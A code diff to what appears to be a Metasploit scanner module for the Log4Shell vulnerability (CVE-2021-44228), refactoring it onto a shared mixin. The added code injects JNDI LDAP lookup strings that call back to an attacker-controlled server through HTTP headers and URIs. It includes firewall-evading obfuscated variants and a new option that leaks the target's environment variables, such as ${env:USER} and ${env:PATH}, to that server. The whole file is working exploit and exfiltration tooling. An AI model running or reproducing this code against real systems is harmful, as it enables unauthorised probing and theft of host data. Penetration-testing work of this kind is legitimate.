@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::Log4Shell
   include Msf::Auxiliary::Scanner
 
   def initialize
@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Auxiliary
         Apache JSPWiki, Apache OFBiz.
       },
       'Author' => [
-        'Spencer McIntyre'
+        'Spencer McIntyre', # The fun stuff
+        'RageLtMan <rageltman[at]sempervictus>', # Some plumbing
       ],
       'References' => [
         [ 'CVE', '2021-44228' ],
@@ -35,9 +36,6 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DisclosureDate' => '2021-12-09',
       'License' => MSF_LICENSE,
-      'DefaultOptions' => {
-        'SRVPORT' => 389
-      },
       'Notes' => {
         'Stability' => [CRASH_SAFE],
         'SideEffects' => [IOC_IN_LOGS],
@@ -49,6 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
       OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
+      OptString.new('LEAK_PARAMS', [ false, 'Additional parameters to leak, separated by the ^ character (e.g., ${env:USER}^${env:PATH})']),
       OptPath.new(
         'HEADERS_FILE',
         [
@@ -69,34 +68,42 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def jndi_string(resource)
-    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
+  def log4j_jndi_string(resource = '')
+    resource = resource.dup
+    resource << '/${java:os}/${sys:java.vendor}_${sys:java.version}'
+    # We should add obfuscation to the URL string to scan through lousy "next-gen" firewalls
+    unless datastore['LEAK_PARAMS'].blank?
+      resource << '/'
+      resource << datastore['LEAK_PARAMS']
+    end
+    super(resource)
   end
 
-  def on_client_connect(client)
-    client.extend(Net::BER::BERParser)
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest
-
-    response = [
-      pdu.message_id.to_ber,
-      [
-        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
-      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
-    ].to_ber_sequence
-    client.write(response)
-
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest
-
-    base_object = pdu.search_parameters[:base_object].to_s
-    token, java_version = base_object.split('/', 2)
-
+  #
+  # Handle incoming requests via service mixin
+  #
+  def build_ldap_search_response(msg_id, base_dn)
+    token, java_os, java_version, uri_parts = base_dn.split('/', 4)
     target_info = @mutex.synchronize { @tokens.delete(token) }
     if target_info
+      @mutex.synchronize { @successes << target_info }
       details = normalize_uri(target_info[:target_uri]).to_s
       details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
+      details << " (os: #{java_os})" unless java_os.blank?
       details << " (java: #{java_version})" unless java_version.blank?
+      unless uri_parts.blank?
+        uri_parts = uri_parts.split('^')
+        leaked = ''
+        datastore['LEAK_PARAMS'].split('^').each_with_index do |input, idx|
+          next if input == uri_parts[idx]
+
+          leaked << "#{input}=#{uri_parts[idx]}  "
+        end
+        unless leaked.blank?
+          details << " (leaked: #{leaked.rstrip})"
+          vprint_good("Leaked data: #{leaked.rstrip}")
+        end
+      end
       peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
       print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
       report_vuln(
@@ -107,10 +114,13 @@ class MetasploitModule < Msf::Auxiliary
         refs: references
       )
     end
-  rescue Net::LDAP::PDU::Error => e
-    vprint_error("#{peer} - #{e}")
-  ensure
-    service.close_client(client)
+
+    attrs = [ ]
+    appseq = [
+      base_dn.to_ber,
+      attrs.to_ber_sequence
+    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
+    [ msg_id.to_ber, appseq ].to_ber_sequence
   end
 
   def rand_text_alpha_lower_numeric(len, bad = '')
@@ -121,12 +131,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])
+    validate_configuration!
     @mutex = Mutex.new
+    @mutex.extend(::Rex::Ref)
+
     @tokens = {}
-    # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
+    @tokens.extend(::Rex::Ref)
+
+    @successes = []
+    @successes.extend(::Rex::Ref)
+
     begin
-      start_service('SSL' => false)
+      start_service
     rescue Rex::BindFailed => e
       fail_with(Failure::BadConfig, e.to_s)
     end
@@ -135,24 +151,12 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections")
     sleep datastore['LDAP_TIMEOUT']
-  ensure
-    stop_service
-  end
 
-  def replicant
-    #
-    # WARNING: This is a horrible pattern and should not be copy-pasted into new code. A better solution is currently
-    # in the works to address service / socket replication as it affects scanner modules.
-    #
-    service = @service
-    @service = nil
-    obj = super
-    @service = service
+    if @successes.empty?
+      return Exploit::CheckCode::Unknown
+    end
 
-    # but do copy the tokens and mutex to the new object
-    obj.mutex = @mutex
-    obj.tokens = @tokens
-    obj
+    Exploit::CheckCode::Vulnerable(details: @successes)
   end
 
   def run_host(ip)
@@ -168,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
 
       if uri.include?('${jndi:uri}')
         token = rand_text_alpha_lower_numeric(8..32)
-        jndi = jndi_string(token)
+        jndi = log4j_jndi_string(token)
         uri.delete_prefix!('/')
         test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))
       else
@@ -178,22 +182,28 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host_uri(_ip, uri)
+    # HTTP_HEADER isn't exposed via the datastore but allows other modules to leverage this one to test a specific value
+    unless datastore['HTTP_HEADER'].blank?
+      token = rand_text_alpha_lower_numeric(8..32)
+      test(token, uri: uri, headers: { datastore['HTTP_HEADER'] => log4j_jndi_string(token) })
+    end
+
     unless datastore['HEADERS_FILE'].blank?
       headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
       headers_file.each_line(chomp: true) do |header|
         next if header.blank? || header.start_with?('#')
 
         token = rand_text_alpha_lower_numeric(8..32)
-        test(token, uri: uri, headers: { header => jndi_string(token) })
+        test(token, uri: uri, headers: { header => log4j_jndi_string(token) })
       end
     end
 
     token = rand_text_alpha_lower_numeric(8..32)
-    jndi = jndi_string(token)
+    jndi = log4j_jndi_string(token)
     test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))
 
     token = rand_text_alpha_lower_numeric(8..32)
-    jndi = jndi_string(token)
+    jndi = log4j_jndi_string(token)
     test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
   end
 
@@ -213,5 +223,5 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  attr_accessor :mutex, :tokens
+  attr_accessor :mutex, :tokens, :successes
 end
